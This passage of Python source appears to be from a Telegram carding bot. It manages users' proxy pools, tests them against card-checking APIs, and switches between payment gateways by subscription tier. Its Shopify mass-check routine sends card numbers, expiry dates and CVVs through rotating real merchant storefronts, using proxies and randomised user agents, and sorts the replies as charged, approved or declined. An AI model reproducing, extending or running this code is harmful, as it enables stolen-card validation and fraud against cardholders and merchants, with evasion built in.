        print(f"📦 Updated user {user_id} proxy list: {len(working_proxies_sorted)} working proxies")
    
    # Prepare final report
    report += f"📊 Total Proxies: {total}\n"
    report += f"✅ Working: {len(working_proxies_sorted)}\n"
    report += f"❌ Failed: {len(failed_proxies)}\n"

    
    if working_proxies_sorted:
        report += f"\n<b>✅ Working Proxies ({len(working_proxies_sorted)}) - Sorted by speed:</b>\n"
        for i, p in enumerate(working_proxies_sorted[:15], 1):
            speed = proxy_speeds.get(p, 0)
            result_msg = proxy_results.get(p, "Working")[:40]
            report += f"  {i}. {mask_proxy(p)} ⚡ {speed:.1f}s - {result_msg}\n"
        if len(working_proxies_sorted) > 15:
            report += f"  ... and {len(working_proxies_sorted) - 15} more\n"
        
        report += f"\n💡 <i>Working proxies have been saved to your personal pool.</i>\n"
        report += f"💡 <i>Use /auc &lt;card&gt; or /aumc &lt;cards&gt; to check cards with these proxies.</i>"
    else:
        report += f"\n❌ <b>No working proxies found!</b>\n\n"
        report += f"Please add more proxies using /addmyproxy or /massproxy\n"
        report += f"Supported formats:\n"
        report += f"• ip:port\n"
        report += f"• user:pass@ip:port\n"
        report += f"• user:pass:ip:port\n"
        report += f"• ip:port:user:pass"
    
    if failed_proxies:
        report += f"\n\n<b>❌ Failed Proxies ({len(failed_proxies)}):</b>\n"
        for p in failed_proxies[:5]:
            error_msg = proxy_results.get(p, "Unknown error")[:60]
            report += f"  • {mask_proxy(p)} - {error_msg}\n"
        if len(failed_proxies) > 5:
            report += f"  ... and {len(failed_proxies) - 5} more\n"
    
    await status_msg.edit_text(report, parse_mode=ParseMode.HTML, reply_markup=back_menu())
    
    print(f"\n{'='*80}")
    print(f"📊 APTEST COMPLETE for user {user_id}")
    print(f"✅ Working: {len(working_proxies_sorted)}/{total}")
    print(f"⏱️ Time: {elapsed} seconds")
    print(f"📍 API Used: Autoshopify (/aumc)")
    print(f"{'='*80}")


# ============ BACKGROUND PROXY HEALTH MONITOR (OPTIONAL) ============

class ProxyHealthMonitor:
    """Background service to periodically test proxies - OPTIONAL"""
    
    def __init__(self, check_interval=3600):  # Check every hour
        self.check_interval = check_interval
        self.running = False
        self._task = None
        
    async def start(self):
        """Start the background monitoring"""
        self.running = True
        self._task = asyncio.create_task(self._monitor_loop())
        print("🔄 Proxy health monitor started (optional)")
        
    async def stop(self):
        """Stop the background monitoring"""
        self.running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except:
                pass
        print("🔄 Proxy health monitor stopped")
    
    async def _monitor_loop(self):
        """Main monitoring loop"""
        while self.running:
            try:
                await self._check_all_users_proxies()
                # Wait for check interval
                for _ in range(int(self.check_interval / 10)):
                    if not self.running:
                        break
                    await asyncio.sleep(10)
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"⚠️ Proxy monitor error: {e}")
                await asyncio.sleep(60)
    
    async def _check_all_users_proxies(self):
        """Check proxies for all users"""
        print("\n🔍 Running scheduled proxy health check...")
        
        for user_id in list(proxy_manager.user_proxies.keys()):
            if not self.running:
                break
                
            proxies = proxy_manager.user_proxies.get(user_id, [])
            if not proxies:
                continue
            
            print(f"👤 Checking proxies for user {user_id} ({len(proxies)} proxies)")
            
            # Test first 3 proxies as a sample
            sample_size = min(3, len(proxies))
            for proxy in proxies[:sample_size]:
                if not self.running:
                    break
                    
                is_working, results = await autosopi_proxy_tester.test_proxy_with_apis(proxy, user_id)
                
                formatted = format_proxy(proxy)
                if formatted:
                    if is_working:
                        proxy_manager.mark_proxy_success_for_user(user_id, formatted)
                    else:
                        proxy_manager.mark_proxy_failure_for_user(user_id, formatted)
                
                await asyncio.sleep(2)  # Be gentle to APIs
            
            await asyncio.sleep(3)
        
        print("✅ Scheduled proxy health check complete")
        
autosopi_proxy_tester = AutosopiProxyTester()


# Create global instance (optional - comment out if not needed)
# proxy_health_monitor = ProxyHealthMonitor()


# ============ USER PROXY COMMANDS ============

async def myproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's personal proxies"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    stats = proxy_manager.get_user_proxy_stats(user_id)
    
    msg = f"🔌 <b>Your Personal Proxies</b>\n\n"
    msg += f"📊 Total: {stats['total']}\n"
    msg += f"✅ Working: {stats['working']}\n"
    msg += f"❌ Failed: {stats['failed']}\n\n"
    
    if stats['proxies']:
        msg += "<b>Your Proxies:</b>\n"
        failed_set = proxy_manager.user_failed_proxies.get(user_id, set())
        for i, p in enumerate(stats['proxies'], 1):
            status = "✅" if p not in failed_set else "❌"
            msg += f"{i}. {status} {mask_proxy(p)}\n"
    else:
        msg += "You haven't added any proxies yet.\n"
        msg += "Use /addmyproxy to add your own proxies.\n\n"
    
    msg += "<b>Commands:</b>\n"
    msg += "/addmyproxy &lt;proxy&gt; - Add a proxy to your personal pool\n"
    msg += "/removemyproxy &lt;proxy&gt; - Remove a proxy from your pool\n"
    msg += "/listmyproxies - List your proxies\n"
    msg += "/clearmyproxies - Clear all your proxies\n"
    msg += "/testmyproxies - Test your proxies"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def add_my_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add a proxy to user's personal pool"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text(
            "➕ <b>Add Your Personal Proxy</b>\n\n"
            "Usage: /addmyproxy &lt;proxy&gt;\n\n"
            "Supported formats:\n"
            "• <code>ip:port</code>\n"
            "• <code>user:pass@ip:port</code>\n"
            "• <code>user:pass:ip:port</code>\n"
            "• <code>ip:port:user:pass</code>\n\n"
            "Example: /addmyproxy 219.100.37.85:2894314:username:password",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy = " ".join(context.args).strip()
    
    if proxy_manager.add_user_proxy(user_id, proxy):
        await update.message.reply_text(
            f"✅ Proxy added to your personal pool:\n{mask_proxy(proxy)}",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            "❌ Invalid proxy format or already exists.",
            parse_mode=ParseMode.HTML
        )

async def remove_my_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a proxy from user's personal pool"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if not context.args:
        await update.message.reply_text(
            "Usage: /removemyproxy &lt;proxy&gt;\n"
            "Example: /removemyproxy 219.100.37.85:2894314:username:password"
        )
        return
    
    proxy = " ".join(context.args).strip()
    
    if proxy_manager.remove_user_proxy(user_id, proxy):
        await update.message.reply_text(f"✅ Proxy removed: {mask_proxy(proxy)}")
    else:
        await update.message.reply_text("❌ Proxy not found in your pool.")

async def list_my_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List user's personal proxies"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    proxies = proxy_manager.user_proxies.get(user_id, [])
    
    if not proxies:
        await update.message.reply_text(
            "📋 You haven't added any proxies yet.\n"
            "Use /addmyproxy to add your first proxy.",
            parse_mode=ParseMode.HTML
        )
        return
    
    msg = f"📋 <b>Your Proxies ({len(proxies)})</b>\n\n"
    failed_set = proxy_manager.user_failed_proxies.get(user_id, set())
    
    for i, p in enumerate(proxies, 1):
        status = "✅" if p not in failed_set else "❌"
        msg += f"{i}. {status} {mask_proxy(p)}\n"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def clear_my_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all proxies from user's personal pool"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if proxy_manager.clear_user_proxies(user_id):
        await update.message.reply_text("🗑️ All your proxies have been cleared.")
    else:
        await update.message.reply_text("📋 You don't have any proxies to clear.")

async def test_my_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test user's personal proxies against B3Charged API"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    proxies = proxy_manager.user_proxies.get(user_id, [])
    
    if not proxies:
        await update.message.reply_text("📋 You don't have any proxies to test.")
        return
    
    # Send initial message
    msg = await update.message.reply_text(
        f"🧪 <b>Testing your proxies</b>\n\n"
        f"📊 Total proxies: {len(proxies)}\n",
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu()
    )
    
    # Clear existing failed list for this user
    proxy_manager.user_failed_proxies[user_id] = set()
    proxy_manager.user_proxy_index[user_id] = 0
    
    # Statistics
    working_proxies = []
    failed_proxies = []
    proxy_speeds = {}
    proxy_results = {}  # Store detailed results
    
    # Use semaphore for concurrency
    semaphore = asyncio.Semaphore(15)  # Lower concurrency for B3 API
    results_lock = asyncio.Lock()
    total = len(proxies)
    completed = 0
    start_time = time.time()
    
    # Test card (use a test card that will return a known response)
    test_card = "4111111111111111|12|2025|123"
    
    async def test_single_proxy(proxy: str, index: int):
        nonlocal completed
        
        async with semaphore:
            masked = mask_proxy(proxy)
            is_working = False
            response_time = 0
            result_message = ""
            
            try:
                # Fix proxy format for B3 API
                formatted_proxy = fix_b3_proxy_format(proxy)
                
                start = time.time()
                
                # Make request to B3Charged API with this proxy
                result = await check_card_b3charged(
                    card=test_card,
                    proxy=formatted_proxy,
                    user_id=user_id,
                    retry_count=0
                )
                
                response_time = time.time() - start
                
                # Check if proxy worked
                if result:
                    status_category = result.get("status_category", "")
                    result_message = result.get("message", "")
                    
                    # Proxy is working if we got ANY valid response (even declined)
                    # Check for responses that indicate the proxy is dead
                    dead_proxy_responses = [
                        'Failed to create account',
                        'Connection error',
                        'Timeout',
                        'Proxy error',
                        'Invalid proxy',
                        'Proxy authentication failed',
                        'site dead',
                        'SITE DEAD'
                    ]
                    
                    is_dead = any(err in result_message.lower() for err in dead_proxy_responses)
                    
                    if status_category in ["approved", "declined"]:
                        is_working = True
                        print(f"✅ [{index}/{total}] {masked} - WORKING ({response_time:.1f}s) - Response: {result_message[:50]}")
                    elif not is_dead and result_message:
                        # Got some response but not approved/declined - still proxy might work
                        is_working = True
                        print(f"⚠️ [{index}/{total}] {masked} - PARTIAL ({response_time:.1f}s) - Response: {result_message[:50]}")
                    else:
                        print(f"❌ [{index}/{total}] {masked} - FAILED: {result_message[:50]}")
                else:
                    print(f"❌ [{index}/{total}] {masked} - No response")
                    
            except Exception as e:
                print(f"❌ [{index}/{total}] {masked} - Error: {e}")
                result_message = str(e)[:50]
            
            async with results_lock:
                completed += 1
                
                if is_working:
                    working_proxies.append(proxy)
                    proxy_speeds[proxy] = response_time
                    proxy_results[proxy] = result_message
                    # Mark as success in proxy manager
                    proxy_manager.mark_proxy_success_for_user(user_id, proxy)
                else:
                    failed_proxies.append(proxy)
                    proxy_results[proxy] = result_message
                    # Mark as failed in proxy manager (will be removed)
                    proxy_manager.mark_proxy_failure_for_user(user_id, proxy)
                
                # Update progress every 5 proxies
                if completed % 5 == 0 or completed == total:
                    elapsed = int(time.time() - start_time)
                    remaining = int((elapsed / completed) * (total - completed)) if completed > 0 else 0
                    progress = int((completed / total) * 10)
                    bar = "▓" * progress + "░" * (10 - progress)
                    
                    await msg.edit_text(
                        f"🧪 <b>Testing your proxies</b>\n\n"
                        f"📊 Total: {total}\n"
                        f"✅ Working: {len(working_proxies)}\n"
                        f"❌ Failed: {len(failed_proxies)}\n",
                        parse_mode=ParseMode.HTML
                    )
    
    # Create tasks for all proxies
    tasks = [test_single_proxy(proxy, i) for i, proxy in enumerate(proxies, 1)]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Save results
    proxy_manager.save_stats()
    
    elapsed = int(time.time() - start_time)
    
    # Sort working proxies by speed (fastest first)
    working_proxies_sorted = sorted(working_proxies, key=lambda p: proxy_speeds.get(p, 999))
    
    # Build final report
    result = f"🧪 <b> Proxy Test Complete!</b>\n\n"
    result += f"📊 Total Proxies: {total}\n"
    result += f"✅ Working: {len(working_proxies)}\n"
    result += f"❌ Failed: {len(failed_proxies)}\n"
    
    if working_proxies:
        result += f"<b>✅ Working Proxies ({len(working_proxies)}) - Sorted by speed:</b>\n"
        for i, p in enumerate(working_proxies_sorted[:10], 1):
            speed = proxy_speeds.get(p, 0)
            response_msg = proxy_results.get(p, "Working")[:40]
            result += f"  {i}. {mask_proxy(p)} ⚡ {speed:.1f}s - {response_msg}\n"
        if len(working_proxies) > 10:
            result += f"  ... and {len(working_proxies) - 10} more\n"
    
    if failed_proxies:
        result += f"\n<b>❌ Failed Proxies ({len(failed_proxies)}):</b>\n"
        for p in failed_proxies[:5]:
            error_msg = proxy_results.get(p, "Unknown error")[:60]
            result += f"  • {mask_proxy(p)} - {error_msg}\n"
        if len(failed_proxies) > 5:
            result += f"  ... and {len(failed_proxies) - 5} more\n"
    
    result += f"\n💡 <i>Working proxies will be used automatically for B3Charged checks.</i>\n"
    result += f"💡 <i>Failed proxies have been removed from your pool.</i>\n"
    result += f"💡 <i>Use /b3 &lt;card&gt; to check cards with your working proxies.</i>"
    
    await msg.edit_text(result, parse_mode=ParseMode.HTML, reply_markup=back_menu())


async def test_proxy_with_b3_api(proxy: str, user_id: int) -> Tuple[bool, float, str]:
    """
    Test a single proxy against B3Charged API
    Returns: (is_working, response_time, result_message)
    """
    if not proxy:
        return False, 0, "No proxy provided"
    
    try:
        # Fix proxy format for B3 API
        formatted_proxy = fix_b3_proxy_format(proxy)
        if not formatted_proxy:
            return False, 0, "Invalid proxy format"
        
        # Use a test card that will return a known response
        test_card = "4111111111111111|12|2025|123"
        
        start = time.time()
        
        # Make request to B3Charged API
        result = await check_card_b3charged(
            card=test_card,
            proxy=formatted_proxy,
            user_id=user_id,
            retry_count=0
        )
        
        response_time = time.time() - start
        
        # Check if proxy worked
        if result:
            status_category = result.get("status_category", "")
            result_message = result.get("message", "")
            
            # Proxy is working if we got ANY valid response (even declined)
            dead_proxy_responses = [
                'Failed to create account',
                'Connection error',
                'Timeout',
                'Proxy error',
                'Invalid proxy',
                'Proxy authentication failed',
                'site dead',
                'SITE DEAD'
            ]
            
            is_dead = any(err in result_message.lower() for err in dead_proxy_responses)
            
            if status_category in ["approved", "declined"]:
                return True, response_time, f"{result_message[:50]}"
            elif not is_dead and result_message:
                # Got some response but not approved/declined - still proxy might work
                return True, response_time, f"Partial: {result_message[:50]}"
            else:
                return False, response_time, result_message[:50]
        else:
            return False, response_time, "No response from API"
            
    except Exception as e:
        return False, 0, str(e)[:50]


async def test_proxy_with_paypal_api(proxy: str, user_id: int) -> Tuple[bool, float]:
    """
    Test a single proxy against PayPal API
    Returns: (is_working, response_time)
    """
    if not proxy:
        return False, 0
    
    try:
        # Format proxy for PayPal
        formatted_proxy = format_proxy_for_paypal(proxy)
        if not formatted_proxy:
            print(f"⚠️ Could not format proxy for PayPal: {mask_proxy(proxy)}")
            return False, 0
        
        # Use a test card that will return a known response
        test_card = "4111111111111111|12|2025|123"
        test_amount = "1.00"
        
        start = time.time()
        
        # Make request to PayPal API
        result = await make_paypal_request(
            card=test_card,
            amount=test_amount,
            currency="USD",
            proxy=formatted_proxy,
            retry_count=0,
            user_id=user_id
        )
        
        response_time = time.time() - start
        
        # Check if proxy worked (got any response, even declined)
        if result and result.get("status") in ["success", "declined"]:
            print(f"✅ Proxy {mask_proxy(proxy)} works with PayPal ({response_time:.1f}s)")
            return True, response_time
        else:
            error_msg = result.get("message", "Unknown error") if result else "No response"
            print(f"❌ Proxy {mask_proxy(proxy)} failed with PayPal: {error_msg}")
            return False, response_time
            
    except Exception as e:
        print(f"❌ Proxy {mask_proxy(proxy)} error: {e}")
        return False, 0


# ============ LEADERBOARD COMMAND ============
async def leaderboard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show leaderboard of top users"""
    if not await verify_group_access(update, context):
        return
    
    period = 'daily'
    if context.args and context.args[0] in ['daily', 'weekly', 'monthly', 'alltime']:
        period = context.args[0]
    
    leaderboard_text = leaderboard.get_top_users(period)
    await update.message.reply_text(leaderboard_text, parse_mode=ParseMode.HTML, reply_markup=back_menu())

# ============ RECOVER COMMAND ============
async def recover_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Recover interrupted sessions"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    pending = session_recovery.get_user_pending_batches(user_id)
    
    if not pending:
        await update.message.reply_text("✅ No interrupted sessions found.", reply_markup=back_menu())
        return
    
    msg = f"🔄 <b>Found {len(pending)} interrupted session(s)</b>\n\n"
    
    for i, batch in enumerate(pending, 1):
        gateway = batch.get('gateway', 'unknown')
        total = batch.get('total_cards', 0)
        processed = batch.get('processed_cards', 0)
        start_time = datetime.fromtimestamp(batch.get('start_time', 0)).strftime("%H:%M:%S")
        
        msg += f"{i}. Gateway: {gateway}\n"
        msg += f"   Progress: {processed}/{total} cards\n"
        msg += f"   Started: {start_time}\n"
        msg += f"   Batch ID: <code>{batch.get('batch_id')}</code>\n\n"
    
    msg += "Use /resume <batch_id> to resume a session."
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())

# ============ RESUME COMMAND ============
async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Resume a specific interrupted batch"""
    if not await verify_group_access(update, context):
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /resume <batch_id>")
        return
    
    batch_id = context.args[0]
    user_id = update.effective_user.id
    pending = session_recovery.get_user_pending_batches(user_id)
    
    for batch in pending:
        if batch.get('batch_id') == batch_id:
            gateway = batch.get('gateway')
            cards = batch.get('cards', [])
            amount = batch.get('amount')
            site = batch.get('site')
            
            session_recovery.clear_user_batches(user_id)
            
            if gateway == 'paypal':
                paypal_active_tasks[user_id] = True
                await update.message.reply_text(
                    f"🔄 <b>Resuming PayPal session</b>\n"
                    f"📝 Cards: {len(cards)}\n"
                    f"🚀 Continuing from where it stopped...",
                    parse_mode=ParseMode.HTML,
                    reply_markup=stop_markup(user_id)
                )
                asyncio.create_task(mass_check_logic(update, context, cards))
            
            return
    
    await update.message.reply_text("❌ Batch not found.")

# ============ QUICK COMMANDS HANDLER ============
async def quick_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle quick commands (/, /pp, /ch, etc.)"""
    if not await verify_group_access(update, context):
        return
    
    text = update.message.text[1:]
    success, cmd, data = quick_cmd_manager.parse(text)
    
    if not success:
        return False
    
    user_id = update.effective_user.id
    
    if cmd == 'help':
        await update.message.reply_text(quick_cmd_manager.get_help(), parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'pp':
        context.user_data['gateway'] = 'paypal'
        await update.message.reply_text("✅ Switched to <b>PayPal</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'sp':
        if not user_manager.can_access_gateway(user_id, 'shopify'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return True
        context.user_data['gateway'] = 'shopify'
        await update.message.reply_text("✅ Switched to <b>Shopify</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'rz':
        if not user_manager.can_access_gateway(user_id, 'razorpay'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return True
        context.user_data['gateway'] = 'razorpay'
        await update.message.reply_text("✅ Switched to <b>Razorpay</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'st':
        context.user_data['gateway'] = 'stripe_charge'
        await update.message.reply_text("✅ Switched to <b>Stripe Charge</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'sta':
        context.user_data['gateway'] = 'stripe_auth'
        await update.message.reply_text("✅ Switched to <b>Stripe Auth</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'bt':
        if not user_manager.can_access_gateway(user_id, 'braintree'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return True
        context.user_data['gateway'] = 'braintree'
        await update.message.reply_text("✅ Switched to <b>Braintree</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'au':
        if not user_manager.can_access_gateway(user_id, 'autosopi'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return True
        context.user_data['gateway'] = 'autosopi'
        await update.message.reply_text("✅ Switched to <b>Autosopi</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'pf':
        if not user_manager.can_access_gateway(user_id, 'payflow'):
            await update.message.reply_text("❌ Your tier doesn't have access to this gateway.")
            return True
        context.user_data['gateway'] = 'payflow'
        await update.message.reply_text("✅ Switched to <b>Payflow</b>", parse_mode=ParseMode.HTML)
        return True
    
    elif cmd == 'ch' and 'args' in data:
        try:
            amount = float(data['args'])
            if amount < 0.50 or amount > 1000:
                await update.message.reply_text("❌ Amount must be between $0.50 and $1000")
                return True
            context.user_data['payment_amount'] = f"{amount:.2f}"
            await update.message.reply_text(f"✅ Amount set to <b>${amount:.2f}</b>", parse_mode=ParseMode.HTML)
        except ValueError:
            await update.message.reply_text("❌ Invalid amount. Use: /ch 2.99")
        return True
    
    elif cmd == 'px':
        args = data.get('args', '')
        if args == 'list':
            await proxy_command(update, context)
        elif args == 'test':
            await proxy_test_command(update, context)
        else:
            await update.message.reply_text(
                "🔄 <b>Proxy Quick Commands:</b>\n"
                "/px list - Show proxy list\n"
                "/px test - Test proxies",
                parse_mode=ParseMode.HTML
            )
        return True
    
    elif cmd == 'lb':
        period = data.get('args', 'daily')
        leaderboard_text = leaderboard.get_top_users(period)
        await update.message.reply_text(leaderboard_text, parse_mode=ParseMode.HTML, reply_markup=back_menu())
        return True
    
    elif cmd == 'rec':
        await recover_command(update, context)
        return True
    
    return False


# ============ NEW SHOPIFY MASS CHECK GATEWAY ============

async def check_card_shopify_mass(card: str, site: str, proxy: str = None, user_id: int = None, retry_count: int = 0, site_list: list = None, site_index: int = 0) -> Dict:
    """
    Check card using Shopify Mass API with site rotation and retry
    """
    # Get all working sites from Autosopi if not provided
    if site_list is None:
        site_list = get_all_working_sites_for_msh()
    
    # If we've exhausted all sites
    if site_index >= len(site_list):
        return {
            "status": "error",
            "result": "ALL_SITES_DEAD",
            "message": "All sites are currently down",
            "status_display": "⚠️ ALL SITES DEAD",
            "status_category": "error",
            "elapsed": 0,
            "retryable": False
        }
    
    current_site = site_list[site_index]
    
    print(f"\n{'='*80}")
    print(f"💳 [SHOPIFY MASS API] Checking card: {card[:20]}...")
    print(f"📍 Site: {current_site} (attempt {site_index + 1}/{len(site_list)})")
    if proxy:
        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
    if retry_count > 0:
        print(f"🔄 RETRY ATTEMPT #{retry_count}")
    print(f"{'='*80}")
    
    # Default result in case of any failure
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "proxy_used": proxy,
        "retryable": False,
        "site_used": current_site
    }
    
    try:
        # Parse card for validation
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, card_mm, card_yy, card_cvv = parts
        
        # Format year
        if len(card_yy) == 4:
            card_yy = card_yy[2:]  # Convert 2026 to 26
        elif len(card_yy) == 2:
            pass  # Keep as is
        
        # Reconstruct card with proper format
        formatted_card = f"{card_num}|{card_mm}|{card_yy}|{card_cvv}"
        
        # Prepare site URL
        if not current_site.startswith(('http://', 'https://')):
            site_clean = f"https://{current_site}"
        else:
            site_clean = current_site
        
        # Prepare parameters
        params = {
            "cc": formatted_card,
            "url": site_clean
        }
        
        # Add proxy if provided
        proxy_param = None
        proxy_used = proxy
        if proxy:
            proxy_param = format_proxy_for_shopify_mass(proxy)
            if proxy_param:
                params["proxy"] = proxy_param
                print(f"🔍 [SHOPIFY MASS API] Using proxy: {mask_proxy(proxy_param)}")
        
        start_time = time.time()
        
        # Make request with timeout
        async with httpx.AsyncClient(timeout=httpx.Timeout(60.0, connect=15.0, read=55.0), verify=False) as client:
            response = await client.get(
                SHOPIFY_MASS_API_ENDPOINT,
                params=params,
                headers={
                    "User-Agent": generate_user_agent(),
                    "Accept": "application/json"
                },
                follow_redirects=True
            )
        
        elapsed = time.time() - start_time
        print(f"📥 Response time: {elapsed:.2f}s")
        print(f"📊 Status code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                print(f"✅ Response: {json.dumps(data, indent=2)}")
                
                # Extract data from API response
                response_text = data.get('Response', 'UNKNOWN')
                gateway = data.get('Gate', 'Shopify Payments')
                price = data.get('Price', '0.00')
                
                # ============ CHECK FOR ERRORS THAT NEED RETRY ============
                response_upper = response_text.upper()
                
                # Errors that should trigger site rotation retry
                retry_errors = [
                    "SITE DEAD",
                    "PROXY DEAD",
                    "TIMEOUT",
                    "CONNECTION ERROR",
                    "HTTP 500",
                    "HTTP 502",
                    "HTTP 503",
                    "SERVER ERROR",
                    "GATEWAY TIMEOUT",
                    "NO RESPONSE"
                ]
                
                # Check if this is a retryable error
                needs_retry = any(err in response_upper for err in retry_errors)
                
                if needs_retry and retry_count == 0:
                    print(f"⚠️ [SHOPIFY MASS API] Error: {response_text} - Retrying with next site...")
                    
                    # Mark site as dead if it's a site error
                    if "SITE DEAD" in response_upper:
                        autosopi_site_manager.mark_site_result(current_site, False, is_site_dead=True)
                        print(f"💀 Site marked as dead: {current_site}")
                    
                    # Mark proxy as dead if proxy error
                    if "PROXY DEAD" in response_upper and proxy_used:
                        print(f"💀 Proxy marked as dead: {mask_proxy(proxy_used)}")
                        if user_id:
                            proxy_manager.mark_proxy_failure_for_user(user_id, proxy_used)
                    
                    # Wait 1 second before retry
                    await asyncio.sleep(1)
                    
                    # Retry with next site
                    return await check_card_shopify_mass(
                        card, current_site, proxy, user_id, 
                        retry_count=1, 
                        site_list=site_list, 
                        site_index=site_index + 1
                    )
                
                # ============ DETERMINE STATUS CATEGORY ============
                charged_patterns = ["CHARGED", "ORDER COMPLETED", "SUCCESS", "PAID", "COMPLETED"]
                otp_patterns = ["OTP", "3D", "SECURE", "AUTHENTICATION", "3DS"]
                insufficient_patterns = ["INSUFFICIENT", "FUNDS"]
                declined_patterns = ["DECLINED", "CARD DECLINED", "REJECTED", "DO NOT HONOR", "GENERIC_ERROR"]
                
                if any(p in response_upper for p in charged_patterns):
                    status_display = "🔥 CHARGED 🔥"
                    status_category = "charged"
                elif any(p in response_upper for p in otp_patterns):
                    status_display = "🔐 3D REQUIRED"
                    status_category = "approved"
                elif any(p in response_upper for p in insufficient_patterns):
                    status_display = "💰 INSUFFICIENT FUNDS"
                    status_category = "approved"
                elif any(p in response_upper for p in declined_patterns):
                    status_display = "❌ DECLINED"
                    status_category = "declined"
                else:
                    status_display = "⚠️ UNKNOWN"
                    status_category = "unknown"
                
                result = {
                    "status": "success" if status_category in ["charged", "approved", "declined"] else "error",
                    "result": response_text,
                    "message": response_text,
                    "status_display": status_display,
                    "status_category": status_category,
                    "elapsed": elapsed,
                    "price": price,
                    "gateway": gateway,
                    "site": current_site,
                    "proxy_used": proxy,
                    "api_used": "shopify_mass_api",
                    "retry_count": retry_count
                }
                
                return result
                
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                print(f"📄 Response text: {response.text[:500]}")
                
                # Retry on JSON error
                if retry_count == 0:
                    print(f"🔄 JSON parse error, retrying with next site...")
                    await asyncio.sleep(1)
                    return await check_card_shopify_mass(
                        card, current_site, proxy, user_id, 
                        retry_count=1, 
                        site_list=site_list, 
                        site_index=site_index + 1
                    )
                
                default_result["message"] = "Invalid JSON response"
                default_result["elapsed"] = elapsed
                return default_result
        else:
            print(f"⚠️ HTTP error: {response.status_code}")
            
            # Retry on HTTP errors (500, 502, 503, 504)
            if response.status_code in [500, 502, 503, 504] and retry_count == 0:
                print(f"🔄 HTTP {response.status_code} error, retrying with next site...")
                await asyncio.sleep(1)
                return await check_card_shopify_mass(
                    card, current_site, proxy, user_id, 
                    retry_count=1, 
                    site_list=site_list, 
                    site_index=site_index + 1
                )
            
            default_result["message"] = f"HTTP Error: {response.status_code}"
            default_result["elapsed"] = elapsed
            return default_result
            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error on site {current_site}")
        
        # Retry on timeout
        if retry_count == 0:
            print(f"🔄 Timeout, retrying with next site...")
            await asyncio.sleep(1)
            return await check_card_shopify_mass(
                card, current_site, proxy, user_id, 
                retry_count=1, 
                site_list=site_list, 
                site_index=site_index + 1
            )
        
        default_result["message"] = "Request timeout - API may be slow"
        return default_result
    except Exception as e:
        print(f"❌ Error: {e}")
        
        # Retry on generic errors
        if retry_count == 0:
            print(f"🔄 Error: {e}, retrying with next site...")
            await asyncio.sleep(1)
            return await check_card_shopify_mass(
                card, current_site, proxy, user_id, 
                retry_count=1, 
                site_list=site_list, 
                site_index=site_index + 1
            )
        
        default_result["message"] = str(e)[:100]
        return default_result


def get_all_working_sites_for_msh() -> list:
    """Get all working sites from Autosopi site manager, excluding dead ones"""
    sites = []
    for site in autosopi_site_manager.sites:
        # Skip sites marked as dead (3+ failures)
        if autosopi_site_manager.site_failures.get(site, 0) < 3:
            sites.append(site)
    
    # If no working sites, use all sites
    if not sites:
        sites = autosopi_site_manager.sites.copy()
    
    # Also add some default working sites if available
    default_sites = [
        "anseladams.org",
        "store.perrinbrewing.com",
        "brybelly.com"
    ]
    
    for ds in default_sites:
        if ds not in sites:
            sites.append(ds)
    
    print(f"📋 Available sites for MSH: {len(sites)} sites")
    return sites


def format_proxy_for_shopify_mass(proxy: str) -> Optional[str]:
    """
    Format proxy for Shopify Mass API
    Expected format: host:port:user:pass or user:pass@host:port
    The API accepts both formats
    """
    if not proxy:
        return None
    
    original_proxy = proxy
    
    try:
